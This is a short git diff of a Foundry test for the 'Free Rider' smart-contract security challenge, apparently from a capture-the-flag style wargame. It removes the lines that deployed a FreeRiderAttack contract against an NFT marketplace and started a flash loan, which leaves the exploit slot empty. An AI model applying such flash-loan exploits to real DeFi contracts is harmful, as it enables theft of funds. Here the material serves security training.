@@ -154,13 +154,7 @@ contract FreeRider is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
-        vm.startPrank(attacker);
-
-        attackContract = new FreeRiderAttack(weth,address(dvt),address(uniswapV2Factory),address(freeRiderNFTMarketplace),address(freeRiderBuyer),address(damnValuableNFT));
-
-        attackContract.flashLoan(weth,NFT_PRICE);
-
-        vm.stopPrank();
+        
 
 
 
